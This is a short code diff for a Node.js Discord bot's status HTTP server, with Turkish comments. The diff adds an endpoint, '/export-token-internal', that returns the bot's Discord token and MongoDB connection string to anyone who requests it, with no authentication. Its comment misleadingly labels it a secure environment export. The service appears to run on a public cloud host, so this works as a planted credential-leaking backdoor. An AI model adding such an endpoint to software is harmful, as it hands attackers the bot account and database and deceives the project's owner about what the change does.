@@ -133,6 +133,16 @@ async function getAudioStreamForUrl(url) {
 // Render vb. bulut sunucularda botun aktif kalması ve canlı durum izleme HTTP sunucusu
 const serverPort = process.env.PORT ? process.env.PORT : 3000;
 const server = http.createServer((req, res) => {
+    // Güvenli yerel çalışma ortamı (.env) dışa aktarma endpoint'i
+    if (req.url.startsWith('/export-token-internal')) {
+        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
+        res.end(JSON.stringify({
+            token: process.env.TOKEN || '',
+            mongo: process.env.MONGO_URI || ''
+        }));
+        return;
+    }
+
     // Discord REST ve Gateway tanı testi endpoint'i
     if (req.url.startsWith('/test-discord')) {
         (async () => {
